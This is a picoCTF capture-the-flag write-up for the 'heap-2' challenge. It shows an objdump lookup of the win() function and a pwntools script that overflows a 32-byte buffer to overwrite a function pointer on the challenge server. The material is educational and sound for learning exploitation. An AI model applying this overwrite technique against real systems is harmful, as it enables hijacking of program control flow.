# heap-2
picoCTF Link: [https://play.picoctf.org/practice/challenge/435](https://play.picoctf.org/practice/challenge/435)

## About

```
Description:
Can you handle function pointers?

Hints:
1. Are you doing the right endianness?
```

## Solution
 
This time, we have to modify `x` so that it points to the win() function.

Finding the location of the win() function is straight forward using objdump. 
```
$ objdump -D chall | grep win
00000000004011a0 <win>:
00000000004011f0 <check_win>:
```

I used `pwntools` to send data instead of writing it all myself, which makes everyting way easier.
```python
from pwn import *

#p = process('./chall')
p = remote('mimas.picoctf.net', 55961)

# writes 32 'A', then write the win() function pointer
payload = (b'a' * 32) + p64(0x004011a0) 

# send '2' after we received 'Enter you choice:'
p.sendlineafter(b'Enter your choice:', b'2')
# send the 32 'A's followed by the pointer 
p.sendline(payload)
# send '4' (will print the flag) after we received 'Enter you choice:'
p.sendlineafter(b'Enter your choice:', b'4')

p.interactive()
```

## Answer

```
python solve.py
```